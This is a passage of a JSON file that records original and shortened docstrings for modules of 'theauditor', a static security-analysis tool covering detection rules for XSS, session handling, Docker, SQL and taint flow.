    "original": "\"\"\"\n    Load AST proof stats from all historical AST files.\n\n    Args:\n        history_dir: Base history directory\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load AST proof stats from all historical AST files.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Load RCA failure stats from all historical RCA files.\n\n    Args:\n        history_dir: Base history directory\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load RCA failure stats from all historical RCA files.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/loaders.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Load AST proof stats from all historical AST files.\n\n    Args:\n        history_dir: Base history directory\n        run_type: Type of runs to load (\"full\", \"diff\", or \"all\")\n    \"\"\"",
    "truncated": "\"\"\"Load AST proof stats from all historical AST files.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Record the start of a pipeline phase.\n\n        Args:\n            phase_name: Human-readable phase name\n            command: Command being executed\n            phase_num: Phase number in sequence\n        \"\"\"",
    "truncated": "\"\"\"Record the start of a pipeline phase.\"\"\""
  },
  {
    "file": "theauditor/manifest_parser.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n        Navigate nested dict with key path.\n        Handles wildcards (*) for dynamic keys.\n\n        Example: [\"tool\", \"poetry\", \"group\", \"*\", \"dependencies\"]\n        Returns the value at the path, or None if not found.\n        \"\"\"",
    "truncated": "\"\"\"Navigate nested dict with key path.\"\"\""
  },
  {
    "file": "theauditor/planning/__init__.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Planning system for task management and verification.\n\nThis package provides:\n- PlanningManager: Database operations for planning.db\n- ShadowRepoManager: Shadow git repository for efficient snapshots (pygit2)\n- verify_task_spec: Verification integration with RefactorRuleEngine\n\"\"\"",
    "truncated": "\"\"\"Planning system for task management and verification.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Update plan status and metadata.\n\n        Args:\n            plan_id: ID of plan to update\n            status: New status (active|archived|cancelled)\n            metadata_json: Optional metadata JSON string\n        \"\"\"",
    "truncated": "\"\"\"Update plan status and metadata.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Manages planning database operations.\n\n    Follows DatabaseManager pattern from theauditor/indexer/database.py\n    but operates on planning.db instead of repo_index.db.\n\n    NO FALLBACKS. Hard failure if planning.db is malformed or missing.\n    \"\"\"",
    "truncated": "\"\"\"Manages planning database operations.\"\"\""
  },
  {
    "file": "theauditor/planning/shadow_git.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Initialize bare repo if missing, otherwise load it.\n\n        Returns:\n            pygit2.Repository instance\n\n        NO FALLBACKS. Raises on any error.\n        \"\"\"",
    "truncated": "\"\"\"Initialize bare repo if missing, otherwise load it.\"\"\""
  },
  {
    "file": "theauditor/refactor/profiles.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"YAML-driven refactor profile evaluation.\n\nThis module lets users define business-logic aware refactor checks via YAML.\nThe profile describes what *old* schema references must disappear and which\n*new* constructs should exist. We leverage the existing repo_index.db tables\nto find exact files/lines without any AI guesses.\n\"\"\"",
    "truncated": "\"\"\"YAML-driven refactor profile evaluation.\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_STANDARD_RULE.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Pattern definitions for your security rule.\n\n    Design principles:\n    - Use frozensets for O(1) membership tests\n    - No regex (use string matching on indexed database fields)\n    - Keep patterns finite and maintainable\n    \"\"\"",
    "truncated": "\"\"\"Pattern definitions for your security rule.\"\"\""
  },
  {
    "file": "theauditor/rules/TEMPLATE_STANDARD_RULE.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check for dangerous function calls with user input.\n\n    Query pattern:\n    1. Find all calls to dangerous functions\n    2. Check if arguments contain user input\n    3. Deduplicate by file:line\n    \"\"\"",
    "truncated": "\"\"\"Check for dangerous function calls with user input.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect weak hash algorithms used for passwords.\n\n    MD5 and SHA1 are broken for password hashing - fast to brute force\n    and vulnerable to rainbow table attacks.\n\n    CWE-327: Use of Broken or Risky Cryptographic Algorithm\n    \"\"\"",
    "truncated": "\"\"\"Detect weak hash algorithms used for passwords.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect cookies set without httpOnly flag.\n\n    Without httpOnly flag, JavaScript can access cookies via document.cookie,\n    making them vulnerable to XSS attacks.\n\n    CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n    \"\"\"",
    "truncated": "\"\"\"Detect cookies set without httpOnly flag.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect cookies set without secure flag.\n\n    Without secure flag, cookies can be transmitted over unencrypted HTTP,\n    making them vulnerable to man-in-the-middle attacks.\n\n    CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n    \"\"\"",
    "truncated": "\"\"\"Detect cookies set without secure flag.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect cookies set without SameSite attribute.\n\n    Without SameSite attribute, cookies are sent with cross-site requests,\n    making them vulnerable to CSRF attacks.\n\n    CWE-352: Cross-Site Request Forgery (CSRF)\n    \"\"\"",
    "truncated": "\"\"\"Detect cookies set without SameSite attribute.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect session fixation vulnerabilities.\n\n    Session fixation occurs when session ID is not regenerated after login,\n    allowing attackers to hijack authenticated sessions.\n\n    CWE-384: Session Fixation\n    \"\"\"",
    "truncated": "\"\"\"Detect session fixation vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/session_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect session configuration without timeout/expiration.\n\n    Sessions without expiration can be valid indefinitely, increasing\n    the window for session hijacking attacks.\n\n    CWE-613: Insufficient Session Expiration\n    \"\"\"",
    "truncated": "\"\"\"Detect session configuration without timeout/expiration.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Attempt to decode Base64 string.\n\n        Returns:\n            Decoded string if UTF-8 decodable,\n            Decoded bytes if binary,\n            None if invalid Base64\n        \"\"\"",
    "truncated": "\"\"\"Attempt to decode Base64 string.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/__init__.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Deployment configuration and security analysis rules.\n\nThis package contains rules for analyzing deployment configurations:\n- compose_analyze: Docker Compose security misconfigurations (11 rules)\n- docker_analyze: Dockerfile security issues (5 checks: root user, secrets, vulnerable images, healthcheck, ports)\n- nginx_analyze: Nginx configuration security (TBD)\n\"\"\"",
    "truncated": "\"\"\"Deployment configuration and security analysis rules.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect containers running as root user.\n\n    CIS Docker Benchmark: Containers should never run as root.\n    A container breakout would grant attacker root privileges on the host.\n\n    Checks docker_images.env_vars['_DOCKER_USER'] field.\n    \"\"\"",
    "truncated": "\"\"\"Detect containers running as root user.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect use of vulnerable or EOL base images.\n\n    Checks for:\n    1. Known vulnerable/deprecated versions\n    2. Unpinned versions (:latest tag)\n    3. Images without registry namespace (typosquatting risk)\n    \"\"\"",
    "truncated": "\"\"\"Detect use of vulnerable or EOL base images.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect containers exposing sensitive management ports.\n\n    Exposing management ports (SSH, RDP, database ports) in production\n    increases attack surface. These should be behind VPN/bastion hosts.\n\n    Checks docker_images.exposed_ports field against known sensitive ports.\n    \"\"\"",
    "truncated": "\"\"\"Detect containers exposing sensitive management ports.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/fastapi_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"FastAPI Framework Security Analyzer - Database-First Approach.\n\nAnalyzes FastAPI applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nThis replaces fastapi_analyzer.py with a faster, cleaner implementation.\n\"\"\"",
    "truncated": "\"\"\"FastAPI Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/rate_limiting.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check for missing rate limiting on expensive queries.\n\n    Note: This is a stub. Full implementation requires:\n    - Analyzing query complexity (field count, depth, list cardinality)\n    - Checking for @rateLimit directives\n    - Detecting pagination implementation\n    \"\"\"",
    "truncated": "\"\"\"Check for missing rate limiting on expensive queries.\"\"\""
  },
  {
    "file": "theauditor/rules/logic/__init__.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Logic and resource management analysis rules.\n\nThis package contains rules for detecting:\n- Business logic errors (money arithmetic, datetime issues)\n- Resource management problems (unclosed files, connections, transactions)\n- Common programming mistakes (divide by zero, percentage calculation errors)\n\"\"\"",
    "truncated": "\"\"\"Logic and resource management analysis rules.\"\"\""
  },
  {
    "file": "theauditor/rules/quality/deadcode_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Dead code detection rule - finds modules never imported.\n\nIntegrated into 'aud full' pipeline via orchestrator.\nGenerates findings with severity='info' (quality concern, not security).\n\nPattern: Follows progress.md rules - analyze() function, execution_scope='database'.\n\"\"\"",
    "truncated": "\"\"\"Dead code detection rule - finds modules never imported.\"\"\""
  },
  {
    "file": "theauditor/rules/react/render_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"React Render Analyzer - Database-Driven Implementation.\n\nDetects React rendering performance issues and anti-patterns using data from\nreact_components, function_call_args, and symbols tables.\n\nFocuses on render optimization and performance bottlenecks.\n\"\"\"",
    "truncated": "\"\"\"React Render Analyzer - Database-Driven Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/react/state_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"React State Analyzer - Database-Driven Implementation.\n\nDetects React state management issues and anti-patterns using data from\nreact_hooks, variable_usage, and assignments tables.\n\nFocuses on state complexity, prop drilling, and state management best practices.\n\"\"\"",
    "truncated": "\"\"\"React State Analyzer - Database-Driven Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/secrets/hardcoded_secret_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Scan file content for secret patterns.\n\n    This is justified file I/O because:\n    1. The database doesn't store full file content\n    2. Pattern matching requires regex evaluation on actual content\n    3. We only scan files identified as suspicious\n    \"\"\"",
    "truncated": "\"\"\"Scan file content for secret patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/api_auth_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check GraphQL mutations for authentication using database queries.\n\n        Replaces regex-based heuristics with direct database queries against:\n        - graphql_types (to find Mutation type)\n        - graphql_fields (to get mutation fields)\n        - graphql_resolver_mappings (to find resolver implementations)\n        \"\"\"",
    "truncated": "\"\"\"Check GraphQL mutations for authentication using database queries.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/multi_tenant_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Multi-Tenant Security Analyzer - Phase 2 Clean Implementation.\n\nDatabase-first detection using ONLY indexed data. No AST traversal, no file I/O.\nFocuses on PostgreSQL RLS (Row Level Security) patterns for multi-tenant applications.\n\nTruth Courier Design: Reports facts about tenant isolation patterns, not recommendations.\n\"\"\"",
    "truncated": "\"\"\"Multi-Tenant Security Analyzer - Phase 2 Clean Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/sql/sql_safety_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"SQL Safety Analyzer - Phase 2 Clean Implementation.\n\nDatabase-first detection using ONLY indexed data. No AST traversal, no file I/O.\nFocuses on SQL safety patterns: missing WHERE, unbounded queries, transaction issues.\n\nTruth Courier Design: Reports facts about SQL patterns, not recommendations.\n\"\"\"",
    "truncated": "\"\"\"SQL Safety Analyzer - Phase 2 Clean Implementation.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/constants.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"XSS Detection Constants - Single Source of Truth.\n\nAll XSS-related constants consolidated here to ensure consistency\nacross xss_analyze.py, vue_xss_analyze.py, and template_xss_analyze.py.\n\nNO DUPLICATES. One brain for sanitizers, sinks, and sources.\n\"\"\"",
    "truncated": "\"\"\"XSS Detection Constants - Single Source of Truth.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check if this is an Express.js application.\n\n    Modernization (2025-11-22):\n    - Removed LIMIT 1000 symbol scan fallback (non-deterministic, violates ZERO FALLBACK POLICY)\n    - Trust the indexer: if frameworks table doesn't list Express, return False immediately\n    - This exposes indexer bugs rather than masking them with guesswork\n    \"\"\"",
    "truncated": "\"\"\"Check if this is an Express.js application.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/express_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check for unsafe template rendering in Express.\n\n    Modernization (2025-11-22):\n    - Fixed N+1: Single self-JOIN instead of loop + query per render call\n    - Performance: Push user input filtering to SQL\n    - Memory safe: Stream results with cursor iteration\n    \"\"\"",
    "truncated": "\"\"\"Check for unsafe template rendering in Express.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check for javascript: URLs in href/src props.\n\n    Modernization (2025-11-22):\n    - Fixed Inverse N+1: Single JOIN instead of loop + query per assignment\n    - Performance: Push href/src and protocol filtering to SQL\n    - Memory safe: Stream results with cursor iteration\n    \"\"\"",
    "truncated": "\"\"\"Check for javascript: URLs in href/src props.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/react_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Check for direct DOM manipulation via refs.\n\n    Modernization (2025-11-22):\n    - Performance: Push ref innerHTML pattern filtering to SQL\n    - Fixed N+1: Single range JOIN instead of loop + proximity query per ref\n    - Memory safe: Stream results with cursor iteration\n    \"\"\"",
    "truncated": "\"\"\"Check for direct DOM manipulation via refs.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/template_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect template injection and XSS vulnerabilities.\n\n    REFACTORED: Uses context manager + sqlite3.Row for cleaner code.\n\n    Returns:\n        List of template-related XSS findings\n    \"\"\"",
    "truncated": "\"\"\"Detect template injection and XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/rules/xss/template_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "r\"\"\"Check for server-side template injection (SSTI).\n\n    BUG FIXES (2025-10-17):\n    1. SQL LIKE wildcard escape: _ must be escaped as \\_ to avoid matching any character\n    2. Context awareness: Only flag 'config.' when near template rendering functions\n    3. Deduplication: Use DISTINCT to avoid duplicate findings from duplicate DB rows\n    \"\"\"",
    "truncated": "r\"\"\"Check for server-side template injection (SSTI).r\"\"\""
  },
  {
    "file": "theauditor/rules/xss/vue_xss_analyze.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Detect Vue.js-specific XSS vulnerabilities.\n\n    REFACTORED: Uses context manager + sqlite3.Row for cleaner code.\n\n    Returns:\n        List of Vue-specific XSS findings\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue.js-specific XSS vulnerabilities.\"\"\""
  },
  {
    "file": "theauditor/session/analysis.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Initialize session analysis orchestrator.\n\n        Args:\n            db_path: Path to repo_index.db for SAST scoring (default: .pf/repo_index.db)\n            project_root: Root directory of project (default: current directory)\n            workflow_path: Path to planning.md (optional)\n        \"\"\"",
    "truncated": "\"\"\"Initialize session analysis orchestrator.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Register a taint source pattern for a specific language.\n\n        Args:\n            pattern: Source pattern (e.g., 'req.body', 'request.args')\n            category: Source category (e.g., 'user_input', 'http_request')\n            language: Language identifier (e.g., 'python', 'javascript', 'rust')\n        \"\"\"",
    "truncated": "\"\"\"Register a taint source pattern for a specific language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Register a taint sink pattern for a specific language.\n\n        Args:\n            pattern: Sink pattern (e.g., 'execute', 'eval', 'system')\n            category: Sink category (e.g., 'sql', 'command', 'xss')\n            language: Language identifier (e.g., 'python', 'javascript', 'rust')\n        \"\"\"",
    "truncated": "\"\"\"Register a taint sink pattern for a specific language.\"\"\""
  },
  {
    "file": "theauditor/taint/core.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Score paths so we keep the most informative version per source/sink pair.\n\n        Score dimensions (higher is better):\n        1. Number of cross-file hops (`cfg_call`, `argument_pass`, `return_flow`)\n        2. Whether the path used flow-sensitive analysis (Stage 3)\n        3. Path length (prefer longer when cross-file, shorter otherwise)\n        \"\"\"",
    "truncated": "\"\"\"Score paths so we keep the most informative version per source/sink pair.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Initialize the flow resolver with database connections.\n\n        Args:\n            repo_db: Path to repo_index.db containing extracted facts\n            graph_db: Path to graphs.db containing unified data flow graph\n            registry: Optional TaintRegistry for polyglot pattern loading\n        \"\"\"",
    "truncated": "\"\"\"Initialize the flow resolver with database connections.\"\"\""
  },
  {
    "file": "theauditor/taint/sanitizer_util.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Initialize sanitizer registry with database cursor.\n\n        Args:\n            repo_cursor: Database cursor to repo_index.db\n            registry: Optional registry object for additional context\n            debug: Enable debug output\n        \"\"\"",
    "truncated": "\"\"\"Initialize sanitizer registry with database cursor.\"\"\""
  },
  {
    "file": "theauditor/taint/schema_cache_adapter.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\nAdapter to make SchemaMemoryCache compatible with existing MemoryCache interface.\n\nThis is a Phase 2 temporary adapter that allows SchemaMemoryCache to work\nwith the existing taint code that expects the old MemoryCache interface.\nThis will be removed in Phase 4 when we refactor the taint code directly.\n\"\"\"",
    "truncated": "\"\"\"Adapter to make SchemaMemoryCache compatible with existing MemoryCache interface.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Resolves type identity for ORM model aliasing.\n\n    Uses graph node metadata to determine if two variables represent the\n    same Data Model type (e.g., both are 'User' model instances).\n\n    Also provides utilities for detecting controller files via api_endpoints.\n    \"\"\"",
    "truncated": "\"\"\"Resolves type identity for ORM model aliasing.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Polyglot Type Identity Checker.\n\nAnswers: \"Do these two variables represent the same Data Model?\"\nUsed for ORM aliasing when no direct graph edge exists.\n\nCreated as part of refactor-polyglot-taint-engine Phase 2 (2025-11-27).\n\"\"\"",
    "truncated": "\"\"\"Polyglot Type Identity Checker.\"\"\""
  },
  {
    "file": "theauditor/terraform/__init__.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Terraform infrastructure analysis subsystem.\n\nProvides Terraform parsing, provisioning graph construction, and security\nanalysis helpers. Security analysis now delegates to the standardized rule\nimplementation in theauditor.rules.terraform.terraform_analyze while\npreserving backwards compatibility with aud terraform analyze.\n\"\"\"",
    "truncated": "\"\"\"Terraform infrastructure analysis subsystem.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Extract all Terraform references from an expression.\n\n        Matches patterns:\n        - aws_*.name (resource references)\n        - var.name (variable references)\n        - data.*.name (data source references)\n        \"\"\"",
    "truncated": "\"\"\"Extract all Terraform references from an expression.\"\"\""
  },
  {
    "file": "theauditor/universal_detector.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Universal pattern detector - AST-first approach with minimal regex fallback.\n\nThis module coordinates pattern detection across the codebase:\n- Uses the orchestrator for all AST-parseable files (Python, JS, TS)\n- Falls back to regex patterns ONLY for non-AST files (configs, shell scripts)\n- Acts as a thin coordination layer, not a detection engine itself\n\"\"\"",
    "truncated": "\"\"\"Universal pattern detector - AST-first approach with minimal regex fallback.\"\"\""
  },
  {
    "file": "theauditor/utils/finding_priority.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"Centralized finding prioritization for internal organization.\n\nThis module provides consistent sorting of findings to ensure\ncritical security issues appear before style warnings in reports.\nThis is NOT severity mapping for tools, but internal organization\nfor optimal AI context utilization.\n\"\"\"",
    "truncated": "\"\"\"Centralized finding prioritization for internal organization.\"\"\""
  },
  {
    "file": "theauditor/utils/helpers.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\n    Save data as JSON to file.\n\n    Args:\n        data: Data to save\n        file_path: Path to output file\n    \"\"\"",
    "truncated": "\"\"\"Save data as JSON to file.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 7,
    "original": "\"\"\"\nMeta-finding formatter for architectural insights.\n\nThis module provides utilities to format meta-analysis findings (from graph,\nCFG, churn, coverage analyzers) into the standard findings_consolidated format\nfor dual-write pattern: database (FCE performance) + JSON (AI consumption).\n\"\"\"",
    "truncated": "\"\"\"Meta-finding formatter for architectural insights.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/base.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Normalize call expression names for downstream analysis.\n\n    Removes argument lists, trailing dots, and extra whitespace so that\n    `app.get('/users', handler)` and `router.post(`/foo`)` both normalize to\n    `app.get` / `router.post`.\n    \"\"\"",
    "truncated": "\"\"\"Normalize call expression names for downstream analysis.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract import statements from Python AST.\n\n    Handles both:\n    - `import X` (ast.Import) -> target = \"X\"\n    - `from X import Y` (ast.ImportFrom) -> target = \"X\" (the module being imported from)\n    \"\"\"",
    "truncated": "\"\"\"Extract import statements from Python AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Extract import statements from TypeScript semantic AST.\n\n    PHASE 5: EXTRACTION-FIRST ARCHITECTURE\n\n    Imports are now part of extracted_data (batch) or tree.imports (individual).\n    \"\"\"",
    "truncated": "\"\"\"Extract import statements from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize CDK analyzer.\n\n        Args:\n            db_path: Path to repo_index.db database\n            severity_filter: Filter findings by severity (all, critical, high, medium, low)\n        \"\"\"",
    "truncated": "\"\"\"Initialize CDK analyzer.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Generate unique finding ID.\n\n        Args:\n            finding: Dictionary from orchestrator.run_database_rules()\n                     Note: dict keys are 'rule' and 'file', not 'rule_name' and 'file_path'\n        \"\"\"",
    "truncated": "\"\"\"Generate unique finding ID.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Find a node ID in the graph matching file and function name.\n\n    Node IDs in graphs.db can have various formats depending on how they\n    were created. This function tries multiple matching strategies.\n    \"\"\"",
    "truncated": "\"\"\"Find a node ID in the graph matching file and function name.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Fallback distance calculation using repo_index.db when graphs.db unavailable.\n\n    NOTE: This fallback does NOT see interceptor edges. It's only used when\n    graphs.db is empty or nodes can't be found.\n    \"\"\"",
    "truncated": "\"\"\"Fallback distance calculation using repo_index.db when graphs.db unavailable.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Manages persistent AST caching for improved performance.\n\n    This cache stores parsed AST trees keyed by file content hash,\n    allowing us to skip re-parsing unchanged files. This provides\n    significant performance improvements for large codebases.\n    \"\"\"",
    "truncated": "\"\"\"Manages persistent AST caching for improved performance.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Load the dependency version cache from repo_index.db.\n\n    Returns empty dict if database doesn't exist or table is empty.\n    Key format: \"manager:package_name:locked_version\" (Universal Keys - Tweak 2)\n    \"\"\"",
    "truncated": "\"\"\"Load the dependency version cache from repo_index.db.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Calculate semantic version delta.\n    Returns: \"major\", \"minor\", \"patch\", \"equal\", or \"unknown\"\n\n    Handles both simple versions (1.2.3) and Docker tags (17-alpine3.21).\n    \"\"\"",
    "truncated": "\"\"\"Calculate semantic version delta.\"\"\""
  },
  {
    "file": "theauditor/docs_fetch.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n    Smart documentation crawler with REDUCED URL patterns.\n\n    Old approach: 5 pages x 4 variants x 12 patterns = 240 attempts\n    New approach: Probe root first, then try 3-5 likely pages = 5-10 attempts\n    \"\"\"",
    "truncated": "\"\"\"Smart documentation crawler with REDUCED URL patterns.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Initialize detector with project path.\n\n        Args:\n            project_path: Root directory of the project.\n            exclude_patterns: List of patterns to exclude from scanning.\n        \"\"\"",
    "truncated": "\"\"\"Initialize detector with project path.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Build and analyze control flow graphs from database.\n\n    2025 MODERNIZATION: Batch loading architecture eliminates N+1 query problem.\n    - Old: 2,000 functions × 3 queries/function = 6,000 database queries\n    - New: 2 queries per file (regardless of function count)\n    \"\"\"",
    "truncated": "\"\"\"Build and analyze control flow graphs from database.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"Build data flow graphs from normalized database tables.\n\n    This builder operates in database-first mode, reading all assignment and\n    return data from the normalized junction tables. NO JSON parsing exists.\n    If data is missing, the query returns empty - exposing indexer bugs.\n    \"\"\"",
    "truncated": "\"\"\"Build data flow graphs from normalized database tables.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Initialize store with database path.\n\n        Args:\n            db_path: Path to SQLite database\n        \"\"\"",
    "truncated": "\"\"\"Initialize store with database path.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Save import graph to database.\n\n        Args:\n            graph: Import graph with nodes and edges\n        \"\"\"",
    "truncated": "\"\"\"Save import graph to database.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Save call graph to database.\n\n        Args:\n            graph: Call graph with nodes and edges\n        \"\"\"",
    "truncated": "\"\"\"Save call graph to database.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Save data flow graph to database.\n\n        Args:\n            graph: Data flow graph with nodes (variables, return values) and edges (assignments, returns)\n        \"\"\"",
    "truncated": "\"\"\"Save data flow graph to database.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Load import graph from database.\n\n        Returns:\n            Import graph dict\n        \"\"\"",
    "truncated": "\"\"\"Load import graph from database.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Load call graph from database.\n\n        Returns:\n            Call graph dict\n        \"\"\"",
    "truncated": "\"\"\"Load call graph from database.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 6,
    "original": "\"\"\"\n        Get summary statistics about stored graphs.\n\n        Returns:\n            Dict with node and edge counts\n        \"\"\"",
    "truncated": "\"\"\"Get summary statistics about stored graphs.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_express.py",
    "line": -1,
    "original_lines": 6,
